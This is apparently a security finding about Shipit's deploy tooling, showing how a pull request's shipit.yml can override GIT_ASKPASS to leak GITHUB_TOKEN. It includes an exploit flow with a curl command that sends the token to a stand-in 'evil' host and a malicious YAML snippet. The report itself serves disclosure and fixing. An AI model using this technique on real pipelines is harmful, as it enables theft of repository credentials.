### Title
PR-controlled `shipit.yml` can declare a `deploy.variables` entry named `GIT_ASKPASS` whose `default` overrides Shipit's safe askpash script, exfiltrating `GITHUB_TOKEN` - ([File: lib/shipit/task_commands.rb])

### Summary
`DeploySpec#deploy_variables`/`default_deploy_env` and `EnvironmentVariables#permit` derive their entire allow-list purely from the shipit.yml being deployed, with no reserved-name protection against security-sensitive keys such as `GIT_ASKPASS`. Because `TaskCommands#env` merges `@task.env` (the deploy's stored, spec-derived env) after the safe `GIT_ASKPASS` value set in `Commands#env`, a PR that declares its own `deploy.variables: [{name: GIT_ASKPASS, default: ./pwn.sh}]` and ships `pwn.sh` in the same branch can silently redirect git credential requests to an attacker script that receives `GITHUB_TOKEN` in its environment.

### Finding Description
Claimed binding (false): "the set of env keys allowed to override credential-bearing names in `Command#unbundled_env` == a set fixed by Shipit's own code, never expandable by any shipit.yml-declared `deploy.variables` entry."

In reality:
- `VariableDefinition#initialize` (`app/models/shipit/variable_definition.rb:7-13`) accepts any `name`/`default` pair from the parsed shipit.yml with no denylist.
- `DeploySpec#deploy_variables` (`app/models/shipit/deploy_spec.rb:120-122`) builds these directly from `config('deploy', 'variables')`, and for a review stack this config is read from the PR's own branch by `DeploySpec::FileSystem`.
- `DeploySpec#default_deploy_env` (`app/models/shipit/deploy_spec.rb:124-126`) is `deploy_variables.map { |v| [v.name, v.default] }.to_h` — no name filtering at all.
- `EnvironmentVariables#permit` (`lib/shipit/environment_variables.rb:35-44`) whitelists purely by `variable_definitions.map(&:name)` — the whitelist itself is attacker-controlled because `deploy_variables` comes from the same untrusted spec, so `GIT_ASKPASS` simply passes the "whitelist" it defined for itself.
- `Stack#build_deploy` (`app/models/shipit/stack.rb:161-172`) calls `filter_deploy_envs(env.to_h)`, and continuous delivery auto-triggers with `trigger_deploy(commit, Shipit.user, env: cached_deploy_spec.default_deploy_env)` (`app/models/shipit/stack.rb:226`) — meaning the malicious default reaches `@task.env` without ever going through API/user-submitted-value scrutiny.
- `TaskCommands#env` (`lib/shipit/task_commands.rb:33-48`) does `super.merge(@stack.env).merge({...}).merge(deploy_spec.machine_env).merge(@task.env)`. `@task.env` is merged **last**, so it silently overrides the safe `GIT_ASKPASS` value set earlier in `Commands#env` (`lib/shipit/commands.rb:37-49`, `env['GIT_ASKPASS'] = .../lib/snippets/git-askpass`).
- `Command#unbundled_env` (`lib/shipit/command.rb:103-105`) merges `@env` over `BASE_ENV`, and `PTY.spawn(unbundled_env, ...)` (`lib/shipit/command.rb:92`) executes with that merged env, including `GITHUB_TOKEN` (set in `Commands#base_env`, `lib/shipit/commands.rb:39-42`) alongside the attacker-controlled `GIT_ASKPASS`.

Exploit flow: attacker forks the repository, commits `pwn.sh` (e.g. `curl -s https://evil/exfil -d "token=$GITHUB_TOKEN"`) and a `shipit.yml` containing:
```yaml
deploy:
  variables:
    - name: GIT_ASKPASS
      default: "./pwn.sh"
```
opens a PR, review stack is provisioned/deployed from that branch's checkout (working directory used by `DeploySpec::FileSystem`), and either continuous delivery or an operator-triggered deploy runs. Git operations that need HTTPS credentials (e.g., `git fetch`/`clone` inside deploy steps) invoke `$GIT_ASKPASS`, now `./pwn.sh`, which receives `GITHUB_TOKEN` in its process environment and exfiltrates it.

Existing guards do not stop this: `EnvironmentVariables#permit` only checks name membership against a list that is itself PR-controlled; there is no code anywhere checking variable names against `Command::BASE_ENV` or a reserved-names set; `Stack#env`, `Commands#base_env`, `TaskCommands#env` all merge with `@task.env` last, giving it final precedence.

### Impact Explanation
Executing a PR-controlled script with `GITHUB_TOKEN` (the org's GitHub App installation token used by Shipit for git operations) in its environment lets an unprivileged PR author exfiltrate that credential. This is repeatable against any repository that has review stacks or continuous deployment enabled, for any org onboarded to Shipit, matching the Critical impact category ("exfiltration of GITHUB_TOKEN ... deploy-time secrets").

### Likelihood Explanation
Requires only: (1) the target repo has review apps or continuous deployment enabled and reads shipit.yml from the branch/PR being built (`DeploySpec::FileSystem` semantics), and (2) `Shipit.use_git_askpass?` true (default in production, per `test/dummy/config/environments/production.rb:81`). No Shipit secrets, sessions, or maintainer privileges are needed — only the ability to open a PR/push a branch, which matches the stated attacker model. Cost is a single PR.

### Recommendation
- Reserve a fixed denylist of environment variable names (e.g. `GIT_ASKPASS`, `PATH`, `GITHUB_TOKEN`, `BUNDLE_*`, `GIT_*`) that `VariableDefinition`/`EnvironmentVariables#permit` must reject regardless of what a shipit.yml declares.
- Ensure security-sensitive keys set in `Commands#base_env`/`Command::BASE_ENV` are applied last (or explicitly protected) in every `env` builder (`TaskCommands#env`, `DeployCommands#env`, `StackCommands#env`) so `@task.env`/`@stack.env` can never clobber them.
- Validate `deploy.variables`/`rollback.variables`/task `variables` names against that denylist when parsing `DeploySpec`, rejecting shipit.yml configs that attempt to declare a reserved name.

### Proof of Concept
```ruby
# test/lib/shipit/task_commands_test.rb (new test)
test "#env never lets deploy_spec variables override GIT_ASKPASS" do
  Shipit.use_git_askpass = true
  stack = shipit_stacks(:shipit)
  deploy = shipit_deploys(:shipit)
  deploy_spec = mock('deploy_spec')
  # Simulate a PR-controlled shipit.yml declaring a GIT_ASKPASS deploy variable
  deploy.stubs(:env).returns(default_deploy_env_from_spec_with_pwn_variable)
  commands = TaskCommands.new(deploy)
  commands.stubs(:deploy_spec).returns(deploy_spec)
  deploy_spec.stubs(:machine_env).returns({})

  refute_equal './pwn.sh', commands.env['GIT_ASKPASS']
  assert_equal Shipit::Engine.root.join('lib', 'snippets', 'git-askpass').realpath.to_s, commands.env['GIT_ASKPASS']
end

def default_deploy_env_from_spec_with_pwn_variable
  spec = Shipit::DeploySpec.new(
    'deploy' => { 'variables' => [{ 'name' => 'GIT_ASKPASS', 'default' => './pwn.sh' }] }
  )
  spec.default_deploy_env # => {"GIT_ASKPASS" => "./pwn.sh"}
end
```
Currently this assertion fails: `commands.env['GIT_ASKPASS']` equals `'./pwn.sh'` because `@task.env` (populated from `default_deploy_env`/`filter_deploy_envs`) is merged last in `TaskCommands#env`, demonstrating the credential-exfiltration path.
